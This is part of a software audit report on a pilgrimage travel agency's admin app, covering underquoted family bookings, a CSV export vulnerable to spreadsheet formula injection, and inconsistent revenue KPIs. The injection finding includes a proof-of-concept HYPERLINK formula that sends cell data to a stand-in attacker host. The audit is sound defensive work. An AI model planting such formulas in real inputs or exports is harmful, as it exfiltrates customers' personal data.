## 2. Detailed Audit Findings

### A09-001 — `Cmd+K` 1-Click Quote Conversion drops `children` and `infants` inputs and converts unpriced (`PKR 0`) room tiers into active `"quoted"` customer dossiers
- Severity: P0
- Category: functional
- Where: `components/layout/command-palette.tsx:90–95, 158, 169–187, 309–317, 601–636`, `app/actions/marketing-ops.ts:1089–1189`
- Brief claim contradicted (if any): §5.4 "total_passport_count = Adults + Children + Infants ... bed_and_seat_count = Adults + Children"
- Evidence: 1. In `components/layout/command-palette.tsx:601–636`, the inline 1-Click Quote form renders numeric inputs for `Children (2-11)` (`childrenCount`, `L94`) and `Infants (<2 yrs)` (`infantsCount`, `L95`). However, `grandEstPkr` (`L317`) computes `rateForTier * Math.max(1, adults)` (ignoring both states in the live preview), and `handleExecuteConversion` (`L179–186`) omits both fields when invoking the server action:
     ```ts
     const res = await convertPostLookupToApplication({
       packageItemId: pkg.id,
       customerName: customerName.trim(),
       customerPhone: customerPhone.trim(),
       customerCity: customerCity.trim() || "Lahore",
       selectedRoomType: roomTier,
       adults: Math.max(1, adults),
     })
     ```
     On the server, `convertPostLookupToApplication` (`app/actions/marketing-ops.ts:1089–1097, 1155–1159`) accepts neither `children` nor `infants` and hardcodes `children: 0`, `infants: 0`, `totalPassportCount: adults`, and `bedAndSeatCount: adults`.
  2. Furthermore, `CommandPalette` initializes `roomTier` to `"sharing"` (`L92, 158`) and allows selecting any of `"sharing" | "quad" | "triple" | "double"` even when `pkg.retailSharingPkr === 0` or `pkg.retailDoublePkr === 0` (tier not offered on supplier flyer). Unlike `saveApplicationQuote` (`app/actions/quotes.ts:105–114`) and `updateApplicationStatus` (`quotes.ts:374–383`), which reject `grandTotalPkr <= 0` for `"quoted"`/`"approved"` states, `convertPostLookupToApplication` (`marketing-ops.ts:1115–1135, 1142, 1170–1188`) directly inserts `applications.status = "quoted"`, `quoteSentAt = new Date()`, and `applicationQuotes.grandTotalPkr = 0` (or `commissionPkr` only when `A05-001` Mode B bug applies).
  3. Scratch harness (`verify-a09.ts`) output for a `2 Adults + 3 Children + 1 Infant` family on a `PKR 280,000` Quad flyer (`PKR 65,000` infant fare):
     ```text
     Family (2A+3C+1I): Cmd+K charges PKR 560,000 vs expected PKR 1,465,000 (underquote: PKR 905,000)
     ```
- Impact (business terms): Any family pilgrimage with children or infants converted via `Cmd+K` is severely underquoted (losing PKR 250,000–900,000+ per family), records wrong passport and bed/seat counts (`Domain Invariant #4` violation), and under-deducts group seats on approval; converting an unavailable room tier issues an official `"quoted"` proposal for `PKR 0`.
- Root cause: `CommandPalette` UI state (`childrenCount`, `infantsCount`) was never wired into `convertPostLookupToApplication`, and `convertPostLookupToApplication` bypasses `quotes.ts` pricing/status invariants without checking `ratePerPax > 0`.
- Recommended fix: 1. Extend `convertPostLookupToApplication` (and a strict Zod input schema) to accept `children` (`0..15`) and `infants` (`0..10`), compute `bedAndSeatCount = adults + children` and `totalPassportCount = adults + children + infants`, price `bedAndSeatCount * ratePerPax + infants * infantPricePkr`, and pass `childrenCount`/`infantsCount` from `CommandPalette` (`L179–186, 317`) and `DeskHubClient` (`desk-hub-client.tsx:1379–1385`).
  2. Disable room tier buttons in `CommandPalette` (`L558–580`) where `rateForTier <= 0` (defaulting to the first positive-priced tier such as `"quad"`), and reject `ratePerPax <= 0` on the server in `convertPostLookupToApplication`.
- Test to add: Integration test calling `convertPostLookupToApplication` with `{ adults: 2, children: 3, infants: 1, selectedRoomType: "quad" }` asserting `totalPassportCount === 6`, `bedAndSeatCount === 5`, and `grandTotalPkr === 5 * retailQuadPkr + infantPricePkr`, plus a test asserting `selectedRoomType` with `retailSharingPkr === 0` returns `{ success: false }`.
- Effort: S (<2h)
- Confidence: High
- Needs owner decision: no

### A09-002 — Dashboard CSV export (`ExportCsvButton`) allows spreadsheet formula injection from public lead inputs and ships all historical PII in every `/admin` RSC payload
- Severity: P1
- Category: security
- Where: `components/admin/dashboard/export-csv-button.tsx:21–66`, `app/admin/(dashboard)/page.tsx:270–284, 326`
- Brief claim contradicted (if any): §9.2 "Every action enforces input validation via Zod and RBAC authorization"
- Evidence: 1. `app/admin/(dashboard)/page.tsx:270–284` builds `exportRecords` across **every** row in `filteredApps` (default `range === "all"`, i.e., the entire `applications` table) including `customerName`, `customerPhone`, and `customerCity`, and passes it to `"use client"` `<ExportCsvButton data={exportRecords} />` (`L326`). Every `/admin` SSR response therefore embeds 100% of historical customer PII in serialized RSC flight data for any `staff` session, even if the button is never clicked.
  2. In `components/admin/dashboard/export-csv-button.tsx:60–63`, values controlled by unauthenticated public callers (`submitCustomApplication`, `submitGroupBookingApplication`, `submitHajjInquiryApplication`, where `customerName`/`customerCity` only check string length) are escaped solely for double quotes:
     ```ts
     csvRows.push(
       values
         .map((v) => `"${String(v).replace(/"/g, '""')}"`)
         .join(",")
     )
     ```
  3. Scratch harness (`verify-a09.ts`) proof with `customerName = '=HYPERLINK("https://evil.example/leak?p="&C2,"Open")'`:
     ```text
     CSV cell emitted: "=HYPERLINK(""https://evil.example/leak?p=""&C2,""Open"")" starts with '"='?: true
     ```
     Microsoft Excel, LibreOffice Calc, and Google Sheets evaluate leading `=`, `+`, `-`, `@`, `\t`, and `\r` inside quoted CSV cells as live formulas/DDE commands.
- Impact (business terms): An external attacker can plant a malicious formula via the public inquiry form that executes in an executive's or staff accountant's spreadsheet upon opening the exported CSV (exfiltrating pilgrim phone numbers/revenue rows via `HYPERLINK`/`WEBSERVICE` or invoking DDE); additionally, any `staff` account can silently dump the agency's entire customer database with zero audit log.
- Root cause: Client-side CSV assembly in `export-csv-button.tsx` omits OWASP CSV formula neutralization, and `page.tsx` pre-serializes the full dataset into client props instead of streaming via an authenticated, audited server endpoint.
- Recommended fix: 1. Sanitize every string cell in CSV generation: if `/^[=+\-@|\t\r]/.test(str)` (or after leading whitespace), prefix with a single quote `'` (`"'=..."`) before wrapping in `"..."`.
  2. Replace client prop serialization (`exportRecords` in `page.tsx:270–284`) with a server route/action gated by `requireSuperAdmin()` (or audited `requireAdmin()`) that queries and streams CSV on demand with an `audit_logs` entry. *(Owner decision needed: whether `staff` consultants or only `super_admin` may bulk-export customer PII CSVs.)*
- Test to add: Unit test verifying CSV serializer neutralizes cells starting with `=`, `+`, `-`, `@`, `\t`, `\r`, and `\n=`, plus authz test verifying unprivileged callers cannot invoke the CSV export endpoint.
- Effort: S (<2h)
- Confidence: High
- Needs owner decision: yes

### A09-003 — Executive Revenue & Pipeline KPIs count unpaid bookings as revenue, drop partial deposits on `"quoted"` dossiers, contradict `/admin/desk` by PKR 645k+, and lack deterministic quote tie-breaking
- Severity: P1
- Category: data-integrity
- Where: `app/admin/(dashboard)/page.tsx:39–42, 127–156`, `components/admin/dashboard/executive-kpi-cards.tsx:35–79`, `components/admin/hubs/desk-hub-client.tsx:465–471`, `db/schema/applications.ts:282–331`
- Brief claim contradicted (if any): §6.2 "Real-time counts of Total Inquiries, Active Quotes, Approved Bookings, Revenue"
- Evidence: 1. **Unpaid `approved` revenue & vanished `quoted` deposits (`page.tsx:141–148`)**:
     ```ts
     } else if (app.status === "approved") {
       approvedCount++
       approvedRevenuePkr += grandTotal
       approvedPilgrimsCount += app.totalPassportCount

       const paid = latestQuote?.amountPaidPkr || 0
       paidRevenuePkr += paid
       unpaidRevenuePkr += Math.max(0, grandTotal - paid)
     }
     ```
     Dragging a Kanban card to `approved` (`updateApplicationStatus`, `quotes.ts:334`) with `paymentStatus = "unpaid"` (`amountPaidPkr = 0`) adds 100% of `grandTotal` to `Approved Revenue`. Conversely, advance deposits recorded while `app.status === "quoted"` (`paymentStatus = "partially_paid"`, `amountPaidPkr > 0`) are **excluded (`PKR 0`)** from `paidRevenuePkr`. If `paymentStatus === "paid_in_full"` with `amountPaidPkr === 0` (permitted by `lib/validations/quote.ts:26–29`), `Paid` displays `PKR 0`. And if a quote is discounted below an already-recorded `amountPaidPkr` (`grandTotal = 450,000`, `paid = 500,000`), `paidRevenuePkr + unpaidRevenuePkr` (`500k + 0 = 500k`) exceeds `approvedRevenuePkr` (`450k`).
  2. **Cross-Hub `"Quoted Pipeline"` Contradiction (`page.tsx:129, 137, 155` vs `desk-hub-client.tsx:465–467`)**: `/admin` labels KPI #2 `"Quoted Pipeline — Awaiting pilgrim confirmation"` (`executive-kpi-cards.tsx:63, 75`) yet computes `quotedPipelinePkr = pendingPipelinePkr + quotedRevenuePkr` using `latestQuote?.grandTotalPkr || app.calculatedVisaTotalPkr || 0` — sweeping in unreviewed `pending_quote` group bookings (which auto-insert draft quotes at `applications.ts:511–526`) and partial visa-only slices of unquoted volatile custom inquiries. Meanwhile, `/admin/desk` (`desk-hub-client.tsx:465–467`) computes `"Quoted Pipeline"` strictly over `status === "quoted"` with `a.quotes?.[0]?.grandTotalPkr || 0`.
  3. **Dead Quote Versioning & Non-Unique Tie-Breaker (`H24`, `page.tsx:39–42`, `desk/page.tsx:54–56`)**: Drizzle generates `ORDER BY "applications_quotes"."version" DESC LIMIT $1` (`verify-a09.ts`), which prevents summing `version 1 + 2 + 3` on `/admin`. However, **every** quote insert in the codebase hardcodes `version: 1` (`applications.ts:303, 513, 651`, `marketing-ops.ts:1172`, `quotes.ts:244`), `db/schema/applications.ts:282–331` has no unique constraint on `(application_id, version)`, and `orderBy` lacks a secondary sort (`desc(updatedAt)`). Concurrent first-quote saves on `WA-INTAKE` dossiers (which start with `0` quote rows at `intake-flow.ts:762`) produce multiple `version = 1` rows whose tie-break order in Postgres is arbitrary heap order.
  4. Scratch harness (`verify-a09.ts`) output on 5 representative dossiers:
     ```text
     Overview (all): { approvedRevenuePkr: 1050000, paidRevenuePkr: 500000, unpaidRevenuePkr: 600000, quotedPipelinePkr: 1045000 }
     Desk Quoted Pipeline: 400000
     Quoted Pipeline mismatch (/admin vs /admin/desk): 645000
     Paid + Due vs Approved Revenue on /admin: 1100000 vs 1050000
     ```
- Impact (business terms): Agency owners cannot trust financial telemetry: `/admin` and `/admin/desk` show conflicting `"Quoted Pipeline"` figures differing by hundreds of thousands of PKR, uncollected approvals inflate revenue, and real pilgrim advance deposits collected during the quoting stage vanish from cash totals.
- Root cause: KPI math was duplicated across `page.tsx` and `desk-hub-client.tsx` with incompatible definitions, `paymentStatus` / `amountPaidPkr` invariants are unenforced in `quoteUpdateSchema`, and `application_quotes` versioning was left half-implemented without a unique `(application_id, version)` index or timestamp tie-breaker.
- Recommended fix: 1. Extract a single shared server KPI query helper used by both `/admin` and `/admin/desk`: separate `Quoted Pipeline` (`status = 'quoted'` only — genuinely awaiting pilgrim confirmation) from `Unquoted Intake Estimate` (`status = 'pending_quote'`), track `Total Cash Collected` across all non-cancelled quotes with `amountPaidPkr > 0`, and clamp `paid <= grandTotal` (or report `Refund/Credit Due` separately).
  2. Enforce `amountPaidPkr <= grandTotalPkr` and server-derived `paymentStatus` in `saveApplicationQuote` (`quotes.ts:219–220`), add a unique index on `application_quotes(application_id, version)`, and append `desc(schema.applicationQuotes.updatedAt), desc(schema.applicationQuotes.id)` to every `quotes` `orderBy`.
- Test to add: Integration test against disposable Postgres seeding `pending_quote` (group + custom volatile + Visa-Only), `quoted` (partially paid), `approved` (unpaid + paid), `rejected`, and `cancelled` rows and asserting exact parity between `/admin` and `/admin/desk` KPI outputs.
- Effort: M (<1d)
- Confidence: High
- Needs owner decision: no
